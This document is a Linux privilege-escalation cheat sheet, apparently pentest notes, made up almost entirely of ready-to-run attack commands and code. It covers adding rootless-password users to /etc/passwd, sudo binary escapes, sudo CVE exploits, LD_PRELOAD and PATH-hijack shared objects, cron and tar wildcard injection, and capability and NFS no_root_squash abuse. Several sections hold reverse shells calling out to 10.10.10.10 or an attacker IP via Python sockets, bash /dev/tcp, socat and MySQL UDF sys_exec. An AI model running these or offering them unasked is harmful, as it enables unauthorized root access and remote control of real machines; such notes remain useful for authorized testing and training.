---
template: overrides/blog.html
icon: material/plus-circle
title: Linux Privilege Escalation
description: >
  
search:
  exclude: true
hide:
  - feedback

tags:
  - Privilege Escalation 
  - Linux
---

# __Linux Privilege Escalation__

https://gtfobins.github.io/
https://grimbins.github.io/
---

## __Privilege Escalation Methods__

- Basic System Enumeration
- Bash History
- OpenVPN Credentials
- Credentials in tcpdump files
- Writable Files
- SSH Private Keys 
- Kernel Expliots
- Sudo -l 
- Sudo CVE 
- Sudo LD_PRELOAD
- SUID / GUID Binaries
- SUID PATH Environmental Variable
- Cron Tabs & Scheduled Tasks
- Capabilities (Python - Perl - Tar - OpenSSL)
- NFS Root Squashing
- chkrootkit 0.49
- Tmux (Attach Session)
- Screen (Attach Session)
- MySQL Running as root
- MySQL UDF (User-Defined Functions) Code (UDF) Injection



## __Basic System Enumeration__

```ps1
uname -a 
hostname 
lscpu 
ls /home 
ls /var/www/html 
ls /var/www/
ps aux | grep root 
netstat -tulpn 
ps -aux | grep root | grep mysql
ifconfig 
find . -type f -exec grep -i -I "PASSWORD=" {} /dev/null \;
locate pass | more
```
## __Bash History__

```ps1
history                            
cat /home/<user>/.bash_history     
cat ~/.bash_history | grep -i passw 
```

## __OpenVPN Credentials__

```ps1
locate *.ovpn                       
```

## __Credentials in tcpdump files__

```ps1
tcpdump -nt -r capture.pcap -A 2>/dev/null | grep -P 'pwd='                    
```

## __Writable Password Files__
If you have write permission to the following files:

- /etc/passwd
- /etc/shadow
- /etc/sudoers



With /etc/passwd
```ps1
   echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd
   su - root2
   id && whoami
   
// Add new user to the system with GID and UID of 0   
   
OR
   
  vi /etc/passwd
  Remote X (Password Holder) for root
  wg!
  su root
  id && whoami
  
// Remove root's password  
  
OR

  echo root::0:0:root:/root:/bin/bash > /etc/passwd
  id && whomai
  
OR

openssl passwd -1 -salt ignite NewRootPassword
Copy output
echo "root2:<output>:0:0:root:/root:/bin/bash" >> /etc/passwd
Replace <output> with the copied output
su root2
id && whoami
  
```  
With /etc/shadow 
```ps1

   Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
   Copy the output
   vi /etc/shadow
   Replace root's hash with the output that you generated
   wq!
   su root 
   id && whoami
   
```    
With /etc/sudoers
```ps1    
   echo "<username> ALL=(ALL:ALL) ALL" >> /etc/sudoers // Replace "Username" with your current user (Example: www-data)
   sudo su
   id && whoami

   ```
# SSH Private Keys 



```ps1
find / -name authorized_keys 2> /dev/null              // Any Public Keys?
find / -name id_rsa 2> /dev/null                       // Any SSH private keys? 

   Copy id_rsa contents of keys found with the above command
   Create a local file on your box and paste the content in
   chmod 600 <local_file>
   ssh -i <local_file> user@IP
   
   // Is the key password protected?

   ssh2john <local_file> > hash
   john hash --wordlist=/usr/share/wordlists/rockyou.txt
   
```

## __Kernel Expliots__


```ps1
uname -a // What OS kernel are we using?

// Google Search (Example): 4.4.0-116-generic #140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github
// Read the expliots and follow the instructions
// Popular Linux Kernel Exploits

Dirty COW (CVE-2016-5195)
URL: https://dirtycow.ninja/

Other Kernel Expliots
URL: https://github.com/SecWiki/linux-kernel-exploits

```

## __Sudo -l__

Sudo -l 

What binaries can we execute with Sudo?

Example Output

User www-data may run the following commands on <hostname>

- (root) NOPASSWD: /usr/bin/find
- (root) NOPASSWD: /usr/bin/nmap
- (root) NOPASSWD: /usr/bin/env
- (root) NOPASSWD: /usr/bin/vim
- (root) NOPASSWD: /usr/bin/awk
- (root) NOPASSWD: /usr/bin/perl
- (root) NOPASSWD: /usr/bin/python
- (root) NOPASSWD: /usr/bin/less
- (root) NOPASSWD: /usr/bin/man
- (root) NOPASSWD: /usr/bin/ftp
- (root) NOPASSWD: /usr/bin/socat
- (root) NOPASSWD: /usr/bin/zip
- (root) NOPASSWD: /usr/bin/gcc
- (root) NOPASSWD: /usr/bin/docker
- (root) NOPASSWD: /usr/bin/env
- (root) NOPASSWD: /usr/bin/MySQL
- (root) NOPASSWD: /usr/bin/ssh
- (root) NOPASSWD: /usr/bin/tmux
- (root) NOPASSWD: /usr/bin/pkexec
- (root) NOPASSWD: /usr/bin/rlwrap
- (root) NOPASSWD: /usr/bin/xargs
- (root) NOPASSWD: /usr/bin/anansi_util
- (root) NOPASSWD: /usr/bin/apt-get
- (root) NOPASSWD: /usr/bin/flask run
- (root) NOPASSWD: /usr/bin/apache2
- (root) NOPASSWD: /usr/bin/wget


### __Absuing Sudo binaries to gain root__
----------------------------------------------------
find
```ps1
sudo find / etc/passwd -exec /bin/bash \;
```

Nmap
```ps1
echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

Env
```ps1
sudo env /bin/bash
```

Vim
```ps1
sudo vim -c ':!/bin/bash'
```

Awk
```ps1
sudo awk 'BEGIN {system("/bin/bash")}'
```

Perl
```ps1
sudo perl -e 'exec "/bin/bash";'
```

Python
```ps1
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

Less
```ps1
sudo less /etc/hosts - !bash
```

Man
```ps1
sudo man man - !bash
```

ftp
```ps1
sudo ftp - ! /bin/bash
```

socat
```ps1
Attacker = socat file:`tty`,raw,echo=0 tcp-listen:1234
Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
```

Zip
```ps1
echo test > notes.txt
sudo zip test.zip notes.txt -T --unzip-command="sh -c /bin/bash"
```

gcc
```ps1
sudo gcc -wrapper /bin/bash,-s .
```

Docker
```ps1
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

MySQL
```ps1
sudo mysql -e '\! /bin/sh'
```

SSH
```ps1
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

Tmux
```ps1
Sudo tmux
```

pkexec
```ps1
sudo pkexec /bin/bash
```

rlwrap
```ps1
sudo rlwrap /bin/bash
```

xargs
```ps1
sudo xargs -a /dev/null sh
```

anansi_util
```ps1
sudo /home/anansi/bin/anansi_util manual /bin/bash  
```

apt-get
```ps1
sudo apt-get update -o APT::Update::Pre-Invoke::=”/bin/bash -i”
```

flask run
```ps1
echo 'import pty; pty.spawn(“/bin/bash”)' > flask.py
export FLASK_APP=flask.py
sudo /usr/bin/flask run
```

apache2

Victim
```ps1
sudo apache2 -f /etc/shadow
Copy root's hash
```
Attacker
```ps1
echo '<root's_hash>' > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt

// Replace <root's_hash> with the hash that you copied 
```
Back to Victim
```ps1
su root
id && whoami
```
Wget

Victim
```ps1
cp /etc/passwd /tmp/passwd
cat /etc/passwd

```
Attacker

```ps1
Copy /etc/passwd content and put in a local file called passwd
Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
Copy output of the above command 
edit passwd
Replace x in root's line with the copied output
Save the file
python -m SimpleHTTPServer 9000 // You can use any port
```

Victim

```ps1
sudo wget http://<attacker_ip>:9000/passwd -O /etc/passwd
su root // Enter the new root password you generated (Example: NewRootPassword)
id && whoami
```


### __Sudo CVE__
Ẽploit sudo with known CVE

CVE:

- CVE-2019-14287
- CVE-2019-16634

#### __CVE-2019-14287__

sudo -V // Get sudo version
sudo -l

Vulnerable output 
Output = (ALL,!root) NOPASSWD: /bin/bash 

```ps1
sudo -u#-1 /bin/bash
id && whoami
    
```

#### __CVE-2019-16634__

sudo -V // Get sudo version

sudo su root // If you type root's password , can you see the *****? // That means pw_feedback is enabled

Expliot PoC: https://github.com/saleemrashid/sudo-cve-2019-18634

Download expliot.c
Upload to Victim 

Attacker
```ps1
python -m SimpleHTTPServer 9000 // You can use any port

```

Victim

```ps1
wget http://<attacker_ip>:9000/expliot.c
Compile expliot.c: gcc expliot.c -o expliot
./expliot
id && whoami 
```

### __Sudo LD_PRELOAD__

sudo -l 

Example Output: env_reset, env_keep+=LD_PRELOAD // Do you have the same output with sudo binary rights?

Expliot

```ps1

cd /tmp
vi priv.c
   
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

Compile priv.c: gcc -fPIC -shared -o priv.so priv.c -nostartfiles
Command: sudo LD_PRELOAD=/tmp/priv.so awk // awk can be replaced with any sudo binary
```

## __SUID / GUID Binaries Overview__


SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges.  Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges. 

Basically, you can change the permission of any file either using the “Numerical” method or “Symbolic” method. As result, it will replace x from s as shown in the below image which denotes especial execution permission with the higher privilege to a particular file/command. Since we are enabling SUID for Owner (user) therefore bit 4 or symbol s will be added before read/write/execution operation.
Basic Enumeration

GUID permission is similar to the SUID permission, only difference is – when the script or command with SGID on is run, it runs as if it were a member of the same group in which the file is a member

Enumeration:

```ps1
find / -perm -u=s -type f 2>/dev/null | xargs ls -l
find / -perm -g=s -type f 2>/dev/null | xargs ls -l
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null 

// Look for any binaries that seem odd. Any binaries running from a users home directory?
// Check the version of any odd binaries and see if there are any public expliots that can be used to gain root


```

## __SUID PATH Environmental Variable__

PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored. When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. The superuser also usually has /sbin and /usr/sbin entries for easily executing system administration commands.

View PATH

```ps1
echo $PATH
env | grep PATH
print $PATH
```
Example 1

Create a Simple Basic SUID binary

```ps1
cd /home/max/
vi test.c

#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("curl -I 127.0.0.1");

  }
```
Compile Binary & Add SUID Bit

```ps1
gcc test.c -o network-tester
chmod u+s network-tester
mv network-tester /bin/tools/
```
Example 1 (Without full bin path)

Privilege Escalation

```ps1
Find the SUID Binary

find / -perm -u=s -type f 2>/dev/null | xargs ls -l
Output Example: /bin/tools/network-tester
ls -la /bin/tools/network-tester

Test the SUID Binary 

/bin/tools/network-tester
strings /bin/tools/network-tester
Output Example: curl -I 127.0.0.1 

Absue the SUID Binary

echo "/bin/bash" > /tmp/curl
chmod 777 /tmp/curl
echo $PATH
export PATH=/tmp:$PATH
/bin/tools/network-tester
id && whoami
```

Example 3 (Without full bin path)

Privilege Escalation

```ps1
Find the SUID Binary

find / -perm -u=s -type f 2>/dev/null | xargs ls -l
Output Example: /bin/tools/webserver-status
ls -la /bin/tools/webserver-status

Test the SUID Binary 

/bin/tools/webserver-status
strings /bin/tools/webserver-status
Output Example: service apache2 status

Absue the SUID Binary

echo 'int mian() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
chmod 777 /tmp/service
export PATH=/tmp:$PATH
echo $PATH
/bin/tools/webserver-status
id && whoami
```

Example 4 (With full bin path)

Privilege Escalation

```ps1
Find the SUID Binary

find / -perm -u=s -type f 2>/dev/null | xargs ls -l
Output Example: /bin/tools/webserver-status
ls -la /bin/tools/webserver-status

Test the SUID Binary 

/bin/tools/webserver-status
strings /bin/tools/webserver-status
Output Example: /usr/sbin/service apache2 status

Absue the SUID Binary

fucntion /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
/bin/tools/webserver-status
id && whoami
```

Example 5 (/bin/systemctl)

Privilege Escalation

Copy line by line inside the victim low priv shell
```ps1
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
/bin/bash -p
id && whoami
```

Example 5 (Copy - /bin/cp)

Privilege Escalation

Victim
```ps1
find / -perm -u=s -type f 2>/dev/null | xargs ls -l
Copy the contents of /etc/passwd to your local machine inside a new file called "passwd"
```
Attacker
```ps1
Run the following command locally: openssl passwd -1 -salt ignite NewRootPassword
Copy the output
Add the following inside the local passwd file
echo "root2:<output>:0:0:root:/root:/bin/bash" >> passwd // Replace <output> with the copied output
python -m SimpleHTTPServer 9000
```
Victim
```ps1
wget -O /tmp/passwd http://10.10.10.10:9000/passwd
cp /tmp/passwd /etc/passwd
su root2
Password: NewRootPassword
id && whoami

// Replace Attacker IP & Port
```
## __Cron Tabs & Scheduled Tasks__

Cron jobs is a time-based job scheduler in Unix-like computer operating systems. Users that set up and maintain software environments use cron to schedule jobs to run periodically at fixed times, dates, or intervals

Enumeration

```ps1
contab -l
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
```
Example 1

Privilege Escalation via Nonexistent File Overwrite

```ps1
cat /etc/crontab
Output Example: * * * * * root systemupdate.sh
echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh
Wait a while
/bin/bash -p
id && whoami
```

Example 2

Privilege Escalation via Root Executable Bash Script

```ps1
cat /etc/crontab
Output Example: * * * * * root /usr/bin/local/network-test.sh
echo "chmod +s /bin/bash" >> /usr/bin/local/network-test.sh
Wait a while
id && whomai
```

Example 3

Privilege Escalation via Root Executable Python Script Overwrite

Target

```ps1
cat /etc/crontab
Output Example: * * * * * root /var/www/html/web-backup.py
cd /var/www/html/
vi web-backup.py
Add the below to the script:

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.10.10",443)); 
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);

// Replace the IP & Port 

// Save & Exit the Script
```
Attacker

```ps1
nc -lvnp 443
```

OR

Target

```ps1
cat /etc/crontab
Output Example: * * * * * root /var/www/html/web-backup.py
cd /var/www/html/
vi web-backup.py
Add the below to the script:

import os

os.system("chmod +s /bin/bash")

// Save & Exit the Script

Wait a While
/bin/bash -p
id && whoami
```

Example 4

Privilege Escalation via Tar Bash Script (WildCards)

```ps1
cat /etc/crontab
Output Example: * * * * * root /usr/bin/local/mysql-db-backup.sh
cat /usr/bin/local/mysql-db-backup.sh
Output of Script:
--------------------------------
#!/bin/bash

cd /var/www/html/
tar czf /tmp/dbbackup.tar.gz *
--------------------------------
cd /var/www/html/
echo "#!/bin/bash" > priv.sh
echo "chmod +s /bin/bash" >> priv.sh
chmod +x priv.sh
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=sh\ priv.sh
Wait a while
/bin/bash -p
id && whomai
```
Example 5

Privilege Escalation via Tar Cron Job

```ps1
cat /etc/crontab
Output Example: */1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*
cd /var/www/html/
echo "chmod +s /bin/bash" > priv.sh
echo "" > "--checkpoint-action=exec=bash priv.sh
echo "" > --checkpoint=1
tar cf archive.tar *

// If it does not work , replace "bash" with "sh"
```


## __Capabilities__

Linux capabilities are special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normally reserved for processes whose effective user ID is 0 (The root user, and only the root user, has UID 0).

Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks.

Essentially, the goal of capabilities is to divide the power of 'root' into specific privileges, so that if a process or binary that has one or more capability is exploited, the potential damage is limited when compared to the same process running as root.

Capabilities can be set on processes and executable files. A process resulting from the execution of a file can gain the capabilities of that file.

- Python
- Perl
- Tar
- OpenSSL

Python

```ps1
getcap -r / 2>/dev/null         
/usr/bin/python2.6 = cap_setuid+ep
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami

OR

getcap -r / 2>/dev/null  
/usr/bin/python3 = cap_setuid+ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id && whoami
```

Perl

```ps1
getcap -r / 2>/dev/null         
/usr/bin/perl = cap_setuid+ep
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
id && whoami
```

Tar

Method 1
```ps1
Victim

getcap -r / 2>/dev/null         
/usr/bin/tar = cap dac read search+ep
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow
Copy content of users accounts to a local file called shadow

Attacker

john shadow --wordlist=/usr/share/wordlists/rockyou.txt
Crack root's credentials

Victim

su root
id && whoami
```
Method 2

```ps1
Victim

getcap -r / 2>/dev/null         
/usr/bin/tar = cap dac read search+ep
/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
/usr/bin/tar -xvf key.tar
cat id_rsa
# Download id_rsa to attacker machine

Attacker

chmod 600 id_rsa
ssh -i id_rsa root@<victim_ip>
id && whoami

```

OpenSSL

Victim
```ps1
getcap -r / 2>/dev/null         
/usr/bin/openssl = cap_setuid+ep
```

Attacker
Create a .so file - Code below
vi priv.c
```ps1
#include <openssl/engine.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static const char *engine_id = "test";
static const char *engine_name = "hope it works";

static int bind(ENGINE *e, const char *id)
{
  int ret = 0;

  if (!ENGINE_set_id(e, engine_id)) {
    fprintf(stderr, "ENGINE_set_id failed\n");
    goto end;
  }
  if (!ENGINE_set_name(e, engine_name)) {
    printf("ENGINE_set_name failed\n");
    goto end;
  }
  setuid(0);
  setgid(0);
  system("chmod +s /bin/bash");    
  system("echo Complete!");
  ret = 1;
 end:
  return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()

```

Compile Code & Create .so file

```ps1
gcc -c fPIC priv.c -o priv
gcc -shared -o priv.so -lcrypto priv
```

Victim

Download .so from Attacker

```ps1
wget -O /tmp/priv.so http://10.10.10.10:9000/priv.so

// Replace IP & Port
```
Get Root

```
openssl req -engine /tmp/priv.so
/bin/bash -p
id && whoami
```

## __NFS Root Squashing__

Network File System (NFS): Network File System permits a user on a client machine to mount the shared files or directories over a network. NFS uses Remote Procedure Calls (RPC) to route requests between clients and servers. Although NFS uses TCP/UDP port 2049 for sharing any files/directories over a network.

- rw: Permit clients to read as well as write access to the shared directory.

- ro: Permit clients to Read-only access to shared directory.

- root_squash: This option Prevents file request made by user root on the client machine because NFS shares change the root user to the nfsnobody user, which is an unprivileged user account.

- no_root_squash: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implication.

- async: It will speed up transfers but can cause data corruption as NFS server doesn’t wait for the complete write operation to be finished on the stable storage, before replying to the client.

- sync:   The sync option does the inverse of async option where the NFS server will reply to the client only after the data is finally written to the stable storage.

Enumeration

```ps1
Victim


cat /etc/exports             // Do we see any no_root_squash enabled on a mounted share?

/tmp *(rw,sync,insecure,no_root_squash,no,subtree,check) 

Attacker

nmap -sV --script=nfs-showmount <victim_ip> 

```
Privilege Escalation

Attacker

```ps1

showmount -e <victim_ip>                      
mkdir /tmp/mount                                
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mount/priv.c  
gcc /tmp/mount/priv.c -o /tmp/mount/priv
chmod +s /tmp/mount/priv

OR

showmount -e <victim_ip>   
mkdir /tmp/mount 
mount -o rw,vers=2 <victim_ip>:/tmp /tmp/mount  
cd /tmp/mount
cp /bin/bash .
chmod +s bash
```
```ps1
Victim

cd /tmp
./priv
id && whoami

OR

cd /tmp
./bash -p
id && whoami
```

## __chkrootkit 0.49__

```
Expliot: https://www.exploit-db.com/exploits/33899

cat /etc/cron.daily

/usr/bin/chkrootkit
ls -la /usr/bin/chkrootkit     // Do we have SUID?
chkrootkit -V
echo "#!/bin/bash" > /tmp/update
echo "chmod +s /bin/bash" >> /tmp/update
Wait a While ...
/bin/bash -p
id && whoami
```

## __Tmux__

tmux is a terminal multiplexer for Unix-like operating systems.

It allows multiple terminal sessions to be accessed simultaneously in a single window.

It is useful for running more than one command-line program at the same time.

Tmux Cheat Sheet: https://tmuxcheatsheet.com/

Privilege Escalation

```
tmux list-sessions                        // Any Tmux sessions running as root?
/tmp/tmux-14/default-root                 // Root Tmux Session
tmux -S /tmp/tmux-14/default-root         // Replace Path to Socket (Depending on your results)

OR

tmux list-sessions                        // Any Tmux sessions running as root?
/tmp/tmux-14/default-root                 // Root Tmux Session
tmux -S /opt/.dev/gbm/ attach -t 0        // Replace Path to Session (Depending on your results)
```

##__MySQL Running as root__

Example 1
```ps1
ps aux | grep root

mysql -u root -p

\! chmod +s /bin/bash
exit
ls -la /bin/bash                          // Verify that the SUID bit is set
/bin/bash -p 
id && whoami
```

Example 2

Victim
```ps1
ps aux | grep root

mysql -u root -p

\! bash -i >& /dev/tcp/10.10.10.10/9999 0>&1
```
Attacker

```ps1
nc -lvnp 9999
id && whoami
```

## __MySQL UDF (User-Defined Functions) Code (UDF) Injection__

User Defined Function (UDF) is a piece of code that extends the functionality of a MySQL server by adding a new function that behaves just like a native (built-in) MySQL function, such as abs() or concat()
UDFs are useful when you need to extend the functionality of your MySQL server
For penetration testing, we can include a UDF inside our database that loads a library that has the ability to execute commands via the sys_exec() function which gives us code execution

Example 1 - Reverse Shell 

Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64
Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32

Victim
```ps1
ps aux | grep root                        //  Verify that MySQL is running as root
Save the UDF in the /tmp folder ( Example: /tmp/lib_mysqludf_sys.so)
mysql -u root -p

mysql> use mysql;
mysql> create table admin(line blob);
mysql> insert into admin values(load_file('/tmp/lib_mysqludf_sys.so'));
mysql> select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so';
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
mysql> select sys_exec('bash -i >& /dev/tcp/10.10.10.10/9999 0>&1');

// Any UDF library can be used , as long as it is exploitable via the sys_exec() function
// The "admin" table name can be named anything
// Ensure that the path to the UDF (.so) is correct
// Replace IP & Port
```
Attacker
```ps1
nc -lvnp 9999
```

Example 2 (Local via SUID)

Download UDF (Linux - 64 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/64
Download UDF (Linux - 32 Bit) = https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/mysql/linux/32

Victim

```ps1
ps aux | grep root                        //  Verify that MySQL is running as root
Save the UDF in the /tmp folder ( Example: /tmp/lib_mysqludf_sys.so)
mysql -u root -p

mysql> use mysql;
mysql> create table admin(line blob);
mysql> insert into admin values(load_file('/tmp/lib_mysqludf_sys.so'));
mysql> select * from admin into dumpfile '/usr/lib/lib_mysqludf_sys.so';
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
mysql> select sys_exec('chmod +s /bin/bash');
mysql> exit
Wait a while
ls -la /bin/bash                         // Verify that the SUID bit is set 
/bin/bash -p
id && whoami
```
Example 3 (Explioting MySQL 4.x/5.0 (Linux))

UDF Link: https://www.exploit-db.com/exploits/1518

Victim
```ps1
wget -O priv.c https://www.exploit-db.com/download/1518
gcc –g –shared –Wl,–soname,priv.so –o priv.so priv.c –lc
chmod 777 priv.so
mv priv.so /tmp/
mysql -u root -p 

mysql> create table priv(line blob);
mysql> insert into priv values(load_file(‘/tmp/priv.so’));
mysql> select * from priv into dumpfile ‘/usr/lib/mysql/plugin/priv.so’;
mysql> create function do_system returns integer soname ‘priv.so’;
mysql> select do_system(‘chmod +s /bin/bash’);
mysql>!sh
/bin/bash -p
id && whoami

// priv.c can be called anything
// The "priv" table name can be named anything
// Ensure that the path to the UDF (.so) is correct
// Replace IP & Port
```



